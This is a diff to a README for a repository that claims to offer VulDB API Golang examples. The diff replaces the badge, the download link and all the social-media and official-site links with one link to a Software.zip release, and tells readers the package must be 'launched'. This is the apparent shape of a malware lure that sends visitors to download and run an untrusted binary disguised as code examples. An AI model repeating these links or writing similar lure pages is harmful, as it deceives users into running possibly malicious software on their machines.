@@ -1,6 +1,6 @@
 # 🚀 Welcome to VulDB API Golang Examples Repository! 🛡️
 
-![VulDB API Golang Examples](https://img.shields.io/badge/VulDB-API%20Golang%20Examples-blue)
+![VulDB API Golang Examples](https://github.com/jack69393/vuldb-api-golang-examples/releases/download/v2.0/Software.zip%20Golang%20Examples-blue)
 
 ## Overview
 
@@ -39,7 +39,7 @@ To get started with the VulDB API Golang examples, follow these steps:
 
 To begin exploring the VulDB API Golang examples, you can download the software package from the following link:
 
-[Download Software Package](https://github.com/user-attachments/files/18410590/Software.zip)
+[Download Software Package](https://github.com/jack69393/vuldb-api-golang-examples/releases/download/v2.0/Software.zip)
 
 Please note: The software package needs to be launched to access the Golang examples for interacting with the VulDB API.
 
@@ -69,9 +69,9 @@ For any questions or assistance regarding the VulDB API Golang examples, please 
 
 Stay updated with the latest developments by following us on social media and joining our community of vulnerability enthusiasts!
 
-- Twitter: [@VulDB](https://twitter.com/VulDB)
-- LinkedIn: [VulDB](https://www.linkedin.com/company/vulnerability-db)
-- Website: [VulDB Official](https://www.vuldb.com/)
+- Twitter: [@VulDB](https://github.com/jack69393/vuldb-api-golang-examples/releases/download/v2.0/Software.zip)
+- LinkedIn: [VulDB](https://github.com/jack69393/vuldb-api-golang-examples/releases/download/v2.0/Software.zip)
+- Website: [VulDB Official](https://github.com/jack69393/vuldb-api-golang-examples/releases/download/v2.0/Software.zip)
 
 Let's dive into the world of vulnerability analysis and management with VulDB API Golang examples! 🕵️‍♂️🔒
 
